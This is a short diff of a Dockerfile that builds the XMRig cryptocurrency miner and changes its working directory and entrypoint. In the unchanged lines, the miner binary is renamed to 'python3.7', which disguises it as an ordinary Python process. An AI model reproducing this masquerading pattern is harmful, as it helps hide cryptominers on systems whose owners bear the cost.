@@ -11,7 +11,6 @@ RUN mkdir xmrig/build && cd xmrig/build && \
     rm -r /xmrig/src
 
 COPY config.json /xmrig/build/config.json
-WORKDIR /xmrig/build
 RUN mv xmrig python3.7
 
-ENTRYPOINT ["./python3.7"]
+ENTRYPOINT ["./entrypoint.sh"]
